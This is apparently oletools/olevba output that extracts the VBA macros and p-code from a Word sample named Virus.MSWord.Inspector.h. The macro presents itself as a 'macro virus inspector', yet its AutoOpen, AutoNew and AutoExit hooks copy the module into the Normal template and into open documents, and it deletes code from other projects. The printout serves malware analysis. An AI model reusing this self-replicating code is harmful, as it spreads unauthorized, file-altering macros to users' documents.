olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inspector.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Inspector.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusInspect.bas 
in file: Virus.MSWord.Inspector.h - OLE stream: 'Macros/VBA/VirusInspect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Inspector Version 8.2
Option Explicit


Dim KillCount As Integer
Dim sAutoNames  As Variant

Dim bInited As Boolean
Dim LatestVer As Double
Dim g_VBCom As Variant
Dim DetectedList As New Collection
Const Logo As String = "Wu's Macro Virus Inspector "



Function Detected(doc As Variant) As Integer
Dim i As Integer
For i = 1 To DetectedList.count
  If (doc.Name = DetectedList.Item(i)) Then
    Detected = i
    Exit Function
  End If
Next
    Detected = 0
End Function
Sub SetDetectedFlag(doc As Variant, ByVal f As Boolean)
Dim i As Integer
i = Detected(doc)
If (f) Then
    If (i < 1) Then
        DetectedList.Add (doc.Name)
    End If
Else
    If (i > 0) Then
        DetectedList.Remove (i)
    End If
End If
End Sub
Sub ClearReg()
While DetectedList.count > 0
    DetectedList.Remove (1)
Wend
End Sub



Sub DeleteCode(cm As Variant, ByVal st, n As Long)
KillCount = KillCount + 1
Call cm.deletelines(st, n)
ShowStatus ("Delete From Line " & st & "to " & st + n)
End Sub
Sub KillSub(cm As Variant, ByVal Name As String)
Dim i, n As Long
'Dim cmd As CodeModule

  If (Not cm.Find(Name, 1, 1, cm.CountOfLines + 1, 1)) Then
   Exit Sub
  End If
  On Error GoTo Err
   i = cm.ProcStartLine(Name, 0) 'vbext_pk_Proc)
   n = cm.ProcCountLines(Name, 0) ' vbext_pk_Proc)
    If (InStr(1, cm.Lines(i, 1), "Wu", vbTextCompare) < 1) Then
     Call DeleteCode(cm, i, n)
    End If
    Exit Sub
Err:
End Sub
Sub KillAutoMod(md As Variant)
Dim Name As Variant
        For Each Name In sAutoNames
               If (InStr(1, md.Name, Name, vbTextCompare) > 0) Then
                        Call KillSub(md, "MAIN")
               End If
        Next Name
 
End Sub

Sub KillVirus(doc As Variant) 'Document)
'VBProject
Dim prj As Variant 'VBProject
Dim obj As Variant
Dim Name As Variant
Dim j, n As Integer
Dim md As Variant 'CodeModule
Dim VBCom As Variant 'VBComponents
Dim count As Integer
Dim saved As Boolean

Call Init
If (Detected(doc)) Then
     Exit Sub
End If

 saved = doc.saved
 
    count = KillCount
    Set prj = doc.VBProject
    Set VBCom = prj.VBComponents
    For j = 1 To VBCom.count
     Set md = VBCom.Item(j).codemodule
        Call KillAutoMod(md)
    Next j
    For j = 1 To VBCom.count
    Set md = VBCom.Item(j).codemodule
        ShowStatus "Scanning In " & md.Name
        For Each Name In sAutoNames
         Call KillSub(md, Name)
        Next Name
        Call KillAutoMod(md)
    Next j
    
    Call SetDetectedFlag(doc, True)
'    prj.VBComponents(1).Activate
    If (KillCount > count) Then
        ClearReg
        If (saved) Then
            Call SafeSave(doc)
        Else
         doc.saved = False
        End If
    Else
     If (saved) Then
     doc.saved = True
     End If
    End If
 
 End Sub
 
 
 
 
 
Sub DetectAll()

Dim doc As Variant 'Document
For Each doc In Documents
 Call KillVirus(doc)
Next
For Each doc In Templates
 Call KillVirus(doc)
Next
If (KillCount > 0) Then
    ShowStatus "杀掉 " & KillCount & "个病毒！但未保存"
Else
    ShowStatus "未发现宏病毒！"
End If
KillCount = 0
End Sub

 
 
 
  
 
Sub Init()
    Dim i As Integer
    Dim obj As Variant
    
    If (bInited) Then
        Exit Sub
    End If
    'MsgBox "Init"
    sAutoNames = Array("Document_Close", "Document_Open", _
    "AutoClose", "AutoOpen", "Document_New", "AutoExec", _
     "AutoNew", "AutoExit")
    Call SetAttr(Application.NormalTemplate.FullName, 32) 'vbArchive)
    Set obj = Application.NormalTemplate
    Call InfectTo(obj)
    KillCount = 0
    ClearReg
    bInited = True
End Sub
Sub AutoExit() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoOpen() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoNew() 'Wu's Sub
 Call DetectAll
End Sub

Sub FileOpen() 'Wu's Sub
Dim doc As Document
With Dialogs(wdDialogFileOpen)
   If (.Show = -1) Then
    Call SetDetectedFlag(ActiveDocument.VBProject, False)
    Call DetectAll
   End If
End With
End Sub
Sub DocClose()
On Error GoTo normal
Call InfectTo(ActiveDocument)
normal:
On Error GoTo Skip
ActiveDocument.Close
Skip:
End Sub

Function MsgMode(s As Variant) As Integer
 MsgMode = msoBalloonButtonYes
End Function
Sub ShowStatus(ByVal s As String)
StatusBar = s
End Sub

Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean = False)
    ShowStatus s
End Sub
Sub CopyTo(doc As Variant, NewName As String)
Dim NewDoc As Document
    doc.Activate
    Selection.WholeStory
    Selection.Copy
    Set NewDoc = Documents.Add
    NewDoc.Activate
    Selection.Paste
    doc.Close SaveChanges:=False
    On Error GoTo prompt
    NewDoc.SaveAs (NewName)
    Exit Sub
prompt:
    With Dialogs(wdDialogFileSaveAs)
    .Name = NewName
    .fileformat = wdFormatDocument
    .Show
    End With
End Sub
Sub KillFile(Path As String)
Dim r As Integer
    r = MsgBox("是否将带毒文件" & Path & " 删除？", vbYesNoCancel, Logo)
    If (r = vbCancel) Then
     End
    Else
     If (r = vbNo) Then
        Exit Sub
     End If
    End If
    On Error GoTo Err
    Kill (Path)
    Call ShowStatus(Path & "Killed!")
    Exit Sub
Err:
    Call ShowStatus("Can not kill file " & Path)

End Sub
Sub SafeSave(doc As Variant)
'
'Dim doc As Document
Dim NewName As String
Dim r As Integer
Dim Path As String
Dim NewDoc As Document
Dim TempName As String
Dim Format As Integer


   NewName = doc.FullName
   On Error GoTo nextline
   Call SetAttr(doc.FullName, vbArchive)
nextline:
   On Error GoTo IsTemp
    Format = doc.SaveFormat
   If (Format = 1) Then
    GoTo IsTemp
   Else
    On Error GoTo ErrSave
    doc.SaveAs (NewName)
   End If
   Exit Sub
IsTemp:
   ' TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot"
'    MsgBox "open temp"
  '  doc.SaveAs FileName:=TempName, fileformat:=1
  '  doc.Close
 '   Kill TempName
 '   On Error GoTo NewDocErr
'    Set doc = Documents.Add(Template:=TempName)
   ' doc.SaveAs FileName:=NewName
Exit Sub
NewDocErr:
ErrSave:

   MsgBox "失败！"
   
End Sub


Function GetVer(prj As Variant) As Double
'Dim pprj As Variant 'VBProject
Dim VBCom As Variant 'VBComponent
Dim VerStr As String
Dim i As Integer
Const Tag As String = "Version"
GetVer = 0#
Set g_VBCom = Nothing
For Each VBCom In prj.VBComponents
   If (VBCom.codemodule.Find(Logo, 1, 1, VBCom.codemodule.CountOfLines + 1, 1)) Then
            Set g_VBCom = VBCom
            GetVer = 0.1
            On Error GoTo NoVer
            VerStr = VBCom.codemodule.Lines(1, 1)
            i = InStr(1, VerStr, Tag, vbTextCompare)
            If (i > 0) Then
                GetVer = Val(Right(VerStr, Len(VerStr) - i - Len(Tag)))
            End If
NoVer:
            Exit Function
   End If
Next VBCom
End Function
Function GetLatest() As Variant
Dim prj As Variant 'VBProject
Dim Ver As Double
Set GetLatest = Nothing
LatestVer = 0
For Each prj In ThisDocument.Application.VBE.VBProjects
  Ver = GetVer(prj)
  If (Ver > LatestVer) Then
     LatestVer = Ver
     Set GetLatest = g_VBCom
  End If
Next prj
End Function
Sub setup()
   Call InfectTo(ThisDocument.Application.NormalTemplate)
   MsgBox "Installed " & Logo
   
  End Sub
  
 Function FoundMod(doc As Variant, ByVal s As String) As Variant
 Dim VBCom As Variant 'VBComponent
 For Each VBCom In doc.VBProject.VBComponents
  If (VBCom.Name = s) Then
  Set FoundMod = VBCom
  Exit Function
  End If
 Next
 Set FoundMod = Nothing
 End Function
 
Sub InfectTo(doc As Variant)
Dim prj As Variant 'VBProject
Dim VBCom, ObjCom As Variant 'VBComponent
Dim r As Double
Dim saved As Boolean


Const modname As String = "VirusInspect"
    
  saved = doc.saved
Set VBCom = GetLatest
r = GetVer(doc.VBProject)
Select Case (r)
 Case Is >= LatestVer: Exit Sub
 Case Else
        If (r > 0) Then
        Call ShowStatus("Upgraded！" & Logo)
        Else
        Call ShowStatus("Installed！" & Logo)
        End If
        Beep
        Beep
        Beep

 End Select
            
        Set ObjCom = FoundMod(doc, modname)
        If (ObjCom Is Nothing) Then
        Set ObjCom = doc.VBProject.VBComponents.Add(1) 'vbext_ct_StdModule  )
        ObjCom.Name = modname
        End If
        Call ObjCom.codemodule.deletelines(1, ObjCom.codemodule.CountOfLines)
        Call ObjCom.codemodule.InsertLines(1, VBCom.codemodule.Lines(1, VBCom.codemodule.CountOfLines + 1))
 If (saved) Then
On Error Resume Next
 Call doc.SaveAs(doc.FullName)
 End If
 
End Sub














































































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Inspector.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/VirusInspect - 19350 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 " Inspector Version 8.2"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn KillCount (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn sAutoNames (As Variant) 0x0010
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn bInited (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn LatestVer (As Double)
' Line #9:
' 	Dim 
' 	VarDefn g_VBCom (As Variant)
' Line #10:
' 	Dim 
' 	VarDefn DetectedList (New )
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x001B "Wu's Macro Virus Inspector "
' 	VarDefn Logo (As String)
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' 	FuncDefn (Function Detected(doc As Variant) As Integer)
' Line #16:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DetectedList 
' 	MemLd count 
' 	For 
' Line #18:
' 	Ld doc 
' 	MemLd New 
' 	Ld i 
' 	Ld DetectedList 
' 	ArgsMemLd Item 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #19:
' 	Ld i 
' 	St Detected 
' Line #20:
' 	ExitFunc 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	LitDI2 0x0000 
' 	St Detected 
' Line #24:
' 	EndFunc 
' Line #25:
' 	FuncDefn (Sub SetDetectedFlag(doc As Variant, ByVal False As Boolean))
' Line #26:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #27:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	St i 
' Line #28:
' 	Ld False 
' 	Paren 
' 	IfBlock 
' Line #29:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #30:
' 	Ld doc 
' 	MemLd New 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Add 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld i 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub ClearReg())
' Line #39:
' 	Ld DetectedList 
' 	MemLd count 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #40:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld DetectedList 
' 	ArgsMemCall Remove 0x0001 
' Line #41:
' 	Wend 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' 	FuncDefn (Sub DeleteCode(cm As Variant, ByVal st, n As Long))
' Line #47:
' 	Ld KillCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St KillCount 
' Line #48:
' 	Ld st 
' 	Ld n 
' 	Ld cm 
' 	ArgsMemCall (Call) deletelines 0x0002 
' Line #49:
' 	LitStr 0x0011 "Delete From Line "
' 	Ld st 
' 	Concat 
' 	LitStr 0x0003 "to "
' 	Concat 
' 	Ld st 
' 	Ld n 
' 	Add 
' 	Concat 
' 	Paren 
' 	ArgsCall ShowStatus 0x0001 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub KillSub(cm As Variant, ByVal New As String))
' Line #52:
' 	Dim 
' 	VarDefn i
' 	VarDefn n (As Long)
' Line #53:
' 	QuoteRem 0x0000 0x0015 "Dim cmd As CodeModule"
' Line #54:
' Line #55:
' 	Ld New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #56:
' 	ExitSub 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	OnError Err 
' Line #59:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St i 
' 	QuoteRem 0x0021 0x000E "vbext_pk_Proc)"
' Line #60:
' 	Ld New 
' 	LitDI2 0x0000 
' 	Ld cm 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St n 
' 	QuoteRem 0x0022 0x000F " vbext_pk_Proc)"
' Line #61:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld cm 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0002 "Wu"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	Ld cm 
' 	Ld i 
' 	Ld n 
' 	ArgsCall (Call) DeleteCode 0x0003 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	ExitSub 
' Line #65:
' 	Label Err 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub KillAutoMod(md As Variant))
' Line #68:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #69:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld md 
' 	MemLd New 
' 	Ld New 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #71:
' 	Ld md 
' 	LitStr 0x0004 "MAIN"
' 	ArgsCall (Call) KillSub 0x0002 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub KillVirus(doc As Variant))
' 	QuoteRem 0x001E 0x0009 "Document)"
' Line #78:
' 	QuoteRem 0x0000 0x0009 "VBProject"
' Line #79:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #80:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #81:
' 	Dim 
' 	VarDefn New (As Variant)
' Line #82:
' 	Dim 
' 	VarDefn j
' 	VarDefn n (As Integer)
' Line #83:
' 	Dim 
' 	VarDefn md (As Variant)
' 	QuoteRem 0x0012 0x000A "CodeModule"
' Line #84:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000C "VBComponents"
' Line #85:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #86:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #87:
' Line #88:
' 	ArgsCall (Call) Init 0x0000 
' Line #89:
' 	Ld doc 
' 	ArgsLd Detected 0x0001 
' 	Paren 
' 	IfBlock 
' Line #90:
' 	ExitSub 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #94:
' Line #95:
' 	Ld KillCount 
' 	St count 
' Line #96:
' 	SetStmt 
' 	Ld doc 
' 	MemLd VBProject 
' 	Set prj 
' Line #97:
' 	SetStmt 
' 	Ld prj 
' 	MemLd VBComponents 
' 	Set VBCom 
' Line #98:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #99:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set md 
' Line #100:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd count 
' 	For 
' Line #103:
' 	SetStmt 
' 	Ld j 
' 	Ld VBCom 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set md 
' Line #104:
' 	LitStr 0x000C "Scanning In "
' 	Ld md 
' 	MemLd New 
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #105:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	Ld sAutoNames 
' 	ForEach 
' Line #106:
' 	Ld md 
' 	Ld New 
' 	ArgsCall (Call) KillSub 0x0002 
' Line #107:
' 	StartForVariable 
' 	Ld New 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Ld md 
' 	ArgsCall (Call) KillAutoMod 0x0001 
' Line #109:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' Line #111:
' 	Ld doc 
' 	LitVarSpecial (True)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #112:
' 	QuoteRem 0x0000 0x0020 "    prj.VBComponents(1).Activate"
' Line #113:
' 	Ld KillCount 
' 	Ld count 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #114:
' 	ArgsCall ClearReg 0x0000 
' Line #115:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #116:
' 	Ld doc 
' 	ArgsCall (Call) SafeSave 0x0001 
' Line #117:
' 	ElseBlock 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld doc 
' 	MemSt saved 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	ElseBlock 
' Line #121:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #122:
' 	LitVarSpecial (True)
' 	Ld doc 
' 	MemSt saved 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	FuncDefn (Sub DetectAll())
' Line #133:
' Line #134:
' 	Dim 
' 	VarDefn doc (As Variant)
' 	QuoteRem 0x0013 0x0008 "Document"
' Line #135:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #136:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #137:
' 	StartForVariable 
' 	Next 
' Line #138:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #139:
' 	Ld doc 
' 	ArgsCall (Call) KillVirus 0x0001 
' Line #140:
' 	StartForVariable 
' 	Next 
' Line #141:
' 	Ld KillCount 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #142:
' 	LitStr 0x0005 "杀掉 "
' 	Ld KillCount 
' 	Concat 
' 	LitStr 0x0010 "个病毒！但未保存"
' 	Concat 
' 	ArgsCall ShowStatus 0x0001 
' Line #143:
' 	ElseBlock 
' Line #144:
' 	LitStr 0x000E "未发现宏病毒！"
' 	ArgsCall ShowStatus 0x0001 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' 	FuncDefn (Sub Init())
' Line #155:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #156:
' 	Dim 
' 	VarDefn obj (As Variant)
' Line #157:
' Line #158:
' 	Ld bInited 
' 	Paren 
' 	IfBlock 
' Line #159:
' 	ExitSub 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	QuoteRem 0x0004 0x000D "MsgBox "Init""
' Line #162:
' 	LineCont 0x0008 08 00 04 00 10 00 05 00
' 	LitStr 0x000E "Document_Close"
' 	LitStr 0x000D "Document_Open"
' 	LitStr 0x0009 "AutoClose"
' 	LitStr 0x0008 "AutoOpen"
' 	LitStr 0x000C "Document_New"
' 	LitStr 0x0008 "AutoExec"
' 	LitStr 0x0007 "AutoNew"
' 	LitStr 0x0008 "AutoExit"
' 	ArgsArray Array 0x0008 
' 	St sAutoNames 
' Line #163:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	LitDI2 0x0020 
' 	ArgsCall (Call) SetAttr 0x0002 
' 	QuoteRem 0x003A 0x000A "vbArchive)"
' Line #164:
' 	SetStmt 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	Set obj 
' Line #165:
' 	Ld obj 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #166:
' 	LitDI2 0x0000 
' 	St KillCount 
' Line #167:
' 	ArgsCall ClearReg 0x0000 
' Line #168:
' 	LitVarSpecial (True)
' 	St bInited 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub AutoExit())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #171:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #174:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub AutoNew())
' 	QuoteRem 0x000E 0x0008 "Wu's Sub"
' Line #177:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #178:
' 	EndSub 
' Line #179:
' Line #180:
' 	FuncDefn (Sub FileOpen())
' 	QuoteRem 0x000F 0x0008 "Wu's Sub"
' Line #181:
' 	Dim 
' 	VarDefn doc (As Document)
' Line #182:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #183:
' 	MemLdWith Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #184:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	LitVarSpecial (False)
' 	ArgsCall (Call) SetDetectedFlag 0x0002 
' Line #185:
' 	ArgsCall (Call) DetectAll 0x0000 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	EndWith 
' Line #188:
' 	EndSub 
' Line #189:
' 	FuncDefn (Sub DocClose())
' Line #190:
' 	OnError normal 
' Line #191:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #192:
' 	Label normal 
' Line #193:
' 	OnError Skip 
' Line #194:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #195:
' 	Label Skip 
' Line #196:
' 	EndSub 
' Line #197:
' Line #198:
' 	FuncDefn (Function MsgMode(s As Variant) As Integer)
' Line #199:
' 	Ld msoBalloonButtonYes 
' 	St MsgMode 
' Line #200:
' 	EndFunc 
' Line #201:
' 	FuncDefn (Sub ShowStatus(ByVal s As String))
' Line #202:
' 	Ld s 
' 	St StatusBar 
' Line #203:
' 	EndSub 
' Line #204:
' Line #205:
' 	ConstFuncExpr 
' 	LitVarSpecial (False)
' 	FuncDefn (Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean))
' Line #206:
' 	Ld s 
' 	ArgsCall ShowStatus 0x0001 
' Line #207:
' 	EndSub 
' Line #208:
' 	FuncDefn (Sub CopyTo(doc As Variant, NewName As String))
' Line #209:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #210:
' 	Ld doc 
' 	ArgsMemCall Activate 0x0000 
' Line #211:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #212:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #213:
' 	SetStmt 
' 	Ld Documents 
' 	MemLd Add 
' 	Set NewDoc 
' Line #214:
' 	Ld NewDoc 
' 	ArgsMemCall Activate 0x0000 
' Line #215:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #216:
' 	LitVarSpecial (False)
' 	ParamNamed SaveChanges 
' 	Ld doc 
' 	ArgsMemCall Close 0x0001 
' Line #217:
' 	OnError prompt 
' Line #218:
' 	Ld NewName 
' 	Paren 
' 	Ld NewDoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #219:
' 	ExitSub 
' Line #220:
' 	Label prompt 
' Line #221:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #222:
' 	Ld NewName 
' 	MemStWith New 
' Line #223:
' 	Ld wdFormatDocument 
' 	MemStWith fileformat 
' Line #224:
' 	ArgsMemCallWith Show 0x0000 
' Line #225:
' 	EndWith 
' Line #226:
' 	EndSub 
' Line #227:
' 	FuncDefn (Sub KillFile(Path As String))
' Line #228:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #229:
' 	LitStr 0x000E "是否将带毒文件"
' 	Ld Path 
' 	Concat 
' 	LitStr 0x0007 " 删除？"
' 	Concat 
' 	Ld vbYesNoCancel 
' 	Ld Logo 
' 	ArgsLd MsgBox 0x0003 
' 	St r 
' Line #230:
' 	Ld r 
' 	Ld vbCancel 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #231:
' 	End 
' Line #232:
' 	ElseBlock 
' Line #233:
' 	Ld r 
' 	Ld vbNo 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #234:
' 	ExitSub 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	OnError Err 
' Line #238:
' 	Ld Path 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #239:
' 	Ld Path 
' 	LitStr 0x0007 "Killed!"
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #240:
' 	ExitSub 
' Line #241:
' 	Label Err 
' Line #242:
' 	LitStr 0x0012 "Can not kill file "
' 	Ld Path 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #243:
' Line #244:
' 	EndSub 
' Line #245:
' 	FuncDefn (Sub SafeSave(doc As Variant))
' Line #246:
' 	QuoteRem 0x0000 0x0000 ""
' Line #247:
' 	QuoteRem 0x0000 0x0013 "Dim doc As Document"
' Line #248:
' 	Dim 
' 	VarDefn NewName (As String)
' Line #249:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #250:
' 	Dim 
' 	VarDefn Path (As String)
' Line #251:
' 	Dim 
' 	VarDefn NewDoc (As Document)
' Line #252:
' 	Dim 
' 	VarDefn TempName (As String)
' Line #253:
' 	Dim 
' 	VarDefn Format$ (As Integer)
' Line #254:
' Line #255:
' Line #256:
' 	Ld doc 
' 	MemLd FullName 
' 	St NewName 
' Line #257:
' 	OnError nextline 
' Line #258:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #259:
' 	Label nextline 
' Line #260:
' 	OnError IsTemp 
' Line #261:
' 	Ld doc 
' 	MemLd SaveFormat 
' 	St Format$ 
' Line #262:
' 	Ld Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #263:
' 	GoTo IsTemp 
' Line #264:
' 	ElseBlock 
' Line #265:
' 	OnError ErrSave 
' Line #266:
' 	Ld NewName 
' 	Paren 
' 	Ld doc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	ExitSub 
' Line #269:
' 	Label IsTemp 
' Line #270:
' 	QuoteRem 0x0003 0x0034 " TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot""
' Line #271:
' 	QuoteRem 0x0000 0x0016 "    MsgBox "open temp""
' Line #272:
' 	QuoteRem 0x0002 0x002E "  doc.SaveAs FileName:=TempName, fileformat:=1"
' Line #273:
' 	QuoteRem 0x0002 0x000B "  doc.Close"
' Line #274:
' 	QuoteRem 0x0001 0x0010 "   Kill TempName"
' Line #275:
' 	QuoteRem 0x0001 0x001A "   On Error GoTo NewDocErr"
' Line #276:
' 	QuoteRem 0x0000 0x002F "    Set doc = Documents.Add(Template:=TempName)"
' Line #277:
' 	QuoteRem 0x0003 0x001D " doc.SaveAs FileName:=NewName"
' Line #278:
' 	ExitSub 
' Line #279:
' 	Label NewDocErr 
' Line #280:
' 	Label ErrSave 
' Line #281:
' Line #282:
' 	LitStr 0x0006 "失败！"
